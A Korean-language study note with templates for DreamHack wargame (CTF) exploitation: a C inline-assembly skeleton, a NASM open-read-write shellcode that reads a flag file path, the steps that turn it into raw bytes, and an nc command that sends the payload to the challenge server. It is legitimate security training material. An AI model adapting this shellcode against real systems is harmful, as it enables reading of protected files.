# code-format

## C언어 스켈레톤 코드

1. 실제 동작 확인 및 디버깅에 사용

### 스켈레톤 코드 양식

```C
// skeleton.c

__asm__(
    // syscall:{rax}(args0:{rdi}, args1:{rsi}, args2:{rdx})
    ".global run.sh\n"
    "start:\n"
    // int fd = open("/tmp/flag", RD_ONLY, NULL); rax(rdi, rsi, rdx)
    
    /* 
    //////////// 작성한 asm 코드 삽입 //////////// 
    /// code는 항상 double quote 삽입
    /// quote 닫기 전 newline(`\n`) 삽입 필수!!!
    //
    // "push 0x0\n"
    // ...
    // "syscall\n"
    // "\n"
    */

    "xor rdi, rdi       /* rdi == 0 */ \n"
    "mov rax, 0x3c      /* exit syscall == 0x3c */\n"
    "syscall"/* exit(0) */ 
);

void start();

int main(void)
{
    start();
    return 0;
}

```

### gcc 목적 파일 변환 및 실행

``` bash
gcc -o skeleton skeleton.c -masm=intel
./skeleton
```

## `.asm` 워게임 페이로드 생성

### 어셈블리 코드 작성

```asm
; shell_basic.asm(예시 파일)
push 0x0 ; // 문제 출력 받이, 반드시 필요!!!!!!!!!!!!!!!!!!
mov rax, 0x676e6f6f6f6f6f6f
push rax
mov rax, 0x6c5f73695f656d61
push rax
mov rax, 0x6e5f67616c662f63
push rax
mov rax, 0x697361625f6c6c65
push rax
mov rax, 0x68732f656d6f682f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x2
syscall
mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0x0
syscall
mov rdi, 0x1
mov rax, 0x1
syscall
```

### 목적 파일 생성 및 `.bin` 파일 생성

``` bash
nasm -f elf64 shell_basic.asm
$ objcopy --dump-section .text=shell_basic.bin shell_basic.o
$ xxd shell_basic.bin
```

### DreamHack 워게임 문제 풀이 방법

- WSL(로컬)에서 문제를 다운로드 받아 풀 경우

    ``` bash
    cat shell_basic.bin | ./problem
    ```

- VM으로 문제를 풀 경우

    ``` bash
    cat ./shell_basic.bin | nc host8.dreamhack.games 15895
    ```
